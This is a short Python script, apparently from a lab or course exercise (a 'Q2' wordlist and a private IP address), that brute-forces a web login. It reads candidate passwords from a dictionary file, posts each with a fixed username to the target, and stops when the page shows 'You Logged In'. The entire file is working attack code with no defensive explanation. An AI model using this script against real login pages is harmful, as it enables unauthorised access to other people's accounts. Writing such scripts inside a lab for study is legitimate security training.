import requests

user = "V_Kaveh137"
url = 'http://172.16.48.80'

with open("../Q2dictionary.txt", 'r') as pw_txt:
    pws = pw_txt.readlines()

for pw in pws:
    pw = pw.strip()
    payload = {'username': user, 'password': pw, 'submit': 'submit'}
    session = requests.Session()
    r = session.post(url, data = payload)
    print("password: " + pw, end = "\r")
    if "You Logged In" in r.text:
        print(f"Password found: {pw}")
        break
